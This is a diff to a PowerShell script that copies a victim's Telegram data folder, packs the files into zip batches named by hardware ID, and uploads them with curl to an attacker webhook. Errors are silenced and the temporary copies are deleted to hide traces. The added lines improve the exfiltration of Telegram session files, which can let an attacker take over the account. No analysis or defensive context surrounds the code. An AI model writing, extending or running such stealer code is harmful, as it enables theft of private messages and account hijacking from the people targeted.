@@ -74,13 +74,63 @@ if (Test-Path $tgPath) {
     New-Item -Path $tgDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
     Copy-Item -Path "$tgPath\*" -Destination $tgDir -Recurse -Force -ErrorAction SilentlyContinue
     $tgFiles = Get-ChildItem -Path $tgDir -Recurse -File
+    $batch = @()
+    $batchSize = 0
+    $batchId = 1
     foreach ($tf in $tgFiles) {
-        if ($tf.Length -lt 8MB) {
+        $fsize = $tf.Length
+        if ($fsize -le 4MB) {
+            if ($batchSize + $fsize -gt 4MB -and $batch.Count -gt 0) {
+                $batchDir = "$env:TEMP\Telegram_batch_${hwid}_$batchId"
+                New-Item -Path $batchDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+                foreach ($bf in $batch) {
+                    $relPath = $bf.FullName.Substring($tgDir.Length + 1)
+                    $destFile = Join-Path $batchDir $relPath
+                    $destDir = Split-Path $destFile -Parent
+                    if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
+                    Copy-Item -Path $bf.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue
+                }
+                $batchZip = "$env:TEMP\Telegram_batch_${hwid}_$batchId.zip"
+                try {
+                    [System.IO.Compression.ZipFile]::CreateFromDirectory($batchDir, $batchZip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
+                } catch {}
+                if (Test-Path $batchZip) {
+                    curl.exe -s -F "file=@$batchZip" $webhook
+                }
+                Remove-Item $batchZip -Force -ErrorAction SilentlyContinue
+                Remove-Item $batchDir -Recurse -Force -ErrorAction SilentlyContinue
+                $batch = @()
+                $batchSize = 0
+                $batchId++
+            }
+            $batch += $tf
+            $batchSize += $fsize
+        } else {
             $tempFile = "$env:TEMP\$($tf.Name)"
             Copy-Item -Path $tf.FullName -Destination $tempFile -Force -ErrorAction SilentlyContinue
             curl.exe -s -F "file=@$tempFile" $webhook
             Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
         }
+    }
+    if ($batch.Count -gt 0) {
+        $batchDir = "$env:TEMP\Telegram_batch_${hwid}_$batchId"
+        New-Item -Path $batchDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+        foreach ($bf in $batch) {
+            $relPath = $bf.FullName.Substring($tgDir.Length + 1)
+            $destFile = Join-Path $batchDir $relPath
+            $destDir = Split-Path $destFile -Parent
+            if (-not (Test-Path $destDir)) { New-Item -Path $destDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
+            Copy-Item -Path $bf.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue
+        }
+        $batchZip = "$env:TEMP\Telegram_batch_${hwid}_$batchId.zip"
+        try {
+            [System.IO.Compression.ZipFile]::CreateFromDirectory($batchDir, $batchZip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
+        } catch {}
+        if (Test-Path $batchZip) {
+            curl.exe -s -F "file=@$batchZip" $webhook
+        }
+        Remove-Item $batchZip -Force -ErrorAction SilentlyContinue
+        Remove-Item $batchDir -Recurse -Force -ErrorAction SilentlyContinue
     }
     Remove-Item $tgDir -Recurse -Force -ErrorAction SilentlyContinue
 }
